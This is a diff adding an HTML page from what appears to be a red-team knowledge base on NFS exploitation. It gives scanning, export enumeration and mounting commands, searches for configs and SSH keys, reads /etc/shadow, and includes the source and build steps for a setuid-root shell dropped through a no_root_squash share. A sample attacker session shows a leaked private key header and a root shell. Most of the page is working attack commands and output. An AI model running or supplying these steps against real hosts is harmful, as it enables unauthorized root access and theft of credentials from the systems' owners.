@@ -1,0 +1,199 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">NFS Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>File Sharing</strong> • Focus: <strong>NFS Abuse & Root Privilege Escalation</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    Network File System (NFS, TCP/2049) allows file and directory sharing across 
+    Unix/Linux systems. Misconfigured NFS exports often allow unauthenticated 
+    mounting, world-readable/writable directories, or root access with 
+    <code>no_root_squash</code>. Attackers exploit NFS to steal sensitive files, 
+    drop malicious binaries, and escalate privileges to root. 
+    In Red Team operations, exposed NFS shares frequently provide a direct 
+    foothold into internal environments.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Unauthenticated Access:</strong> NFS shares often mountable without creds.</li>
+    <li><strong>Misconfigured Exports:</strong> World-readable or writable directories exposed.</li>
+    <li><strong>no_root_squash:</strong> Remote root mapped as local root, enabling privilege escalation.</li>
+    <li><strong>Sensitive Data:</strong> Config files, SSH keys, DB dumps often stored in NFS shares.</li>
+    <li><strong>Lateral Movement:</strong> Dropped binaries/scripts executed across multiple hosts.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Scan for NFS service on TCP/2049.</li>
+    <li><strong>Enumeration:</strong> List available exports with <code>showmount</code>.</li>
+    <li><strong>Mount Shares:</strong> Mount exports locally for read/write access.</li>
+    <li><strong>Privilege Escalation:</strong> Abuse <code>no_root_squash</code> to place SUID binaries or SSH keys.</li>
+    <li><strong>Impact:</strong> Full data exfiltration and remote root shell.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan for NFS services on TCP/2049.</li>
+    <li>Enumerate available exports with <code>showmount -e</code>.</li>
+    <li>Mount exports locally with <code>mount -t nfs</code>.</li>
+    <li>Search for sensitive files (configs, SSH keys, DBs).</li>
+    <li>Exploit <code>no_root_squash</code> by dropping SUID or SSH keys.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p2049 --script nfs-showmount [target]
+
+# ------------------------------
+# Enumeration
+# ------------------------------
+showmount -e [target]
+
+# ------------------------------
+# Mount Export
+# ------------------------------
+mkdir /mnt/nfs
+mount -t nfs [target]:/share /mnt/nfs
+
+# ------------------------------
+# Data Hunting
+# ------------------------------
+find /mnt/nfs -type f -iname "*.conf"
+find /mnt/nfs -type f -iname "*id_rsa*"
+
+# ------------------------------
+# Exploitation - no_root_squash
+# ------------------------------
+echo 'int main(){setuid(0);system("/bin/bash");}' > root.c
+gcc root.c -o root_suid
+chmod +s root_suid
+cp root_suid /mnt/nfs/
+
+# On victim host (once synced)
+./root_suid
+whoami   # root
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p2049 192.168.1.150 --script nfs-showmount
+showmount -e 192.168.1.150
+mount -t nfs 192.168.1.150:/share /mnt/nfs
+cat /mnt/nfs/etc/shadow
+cp root_suid /mnt/nfs/tmp/
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p2049 --script nfs-showmount 192.168.1.150
+PORT     STATE SERVICE
+2049/tcp open  nfs
+| nfs-showmount:
+|   /share     Everyone
+|   /backups   Everyone
+
+[ saide ~ ]$ showmount -e 192.168.1.150
+Export list for 192.168.1.150:
+/share   *
+/backups *
+
+[ saide ~ ]$ mount -t nfs 192.168.1.150:/share /mnt/nfs
+[+] Mounted /share successfully
+
+[ saide ~ ]$ ls /mnt/nfs
+configs  secrets  ssh_keys
+
+[ saide ~ ]$ cat /mnt/nfs/ssh_keys/id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEArT....
+
+[ saide ~ ]$ cp root_suid /mnt/nfs/tmp/
+[+] SUID backdoor placed
+
+On victim host:
+root@victim:/tmp# ./root_suid
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+[+] Root shell achieved via NFS misconfiguration
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample NFS exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+2049/tcp open  nfs
+
+# Exports
+/share   Everyone
+/backups Everyone
+
+# Sensitive Data
+SSH private key discovered: id_rsa
+
+# Exploitation
+SUID binary placed on share
+
+# Proof of Exploitation
+Remote root shell via NFS no_root_squash
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-nfs" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting NFS
+      </a>
+    </li>
+    <li>
+      <a href="https://attack.mitre.org/techniques/T1136/001/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MITRE ATT&CK – Create Account: Unix
+      </a>
+    </li>
+    <li>Red Team workflow: Discover → Enum exports → Mount shares → Extract secrets → Abuse no_root_squash → Root shell.</li>
+  </ul>
+</section>
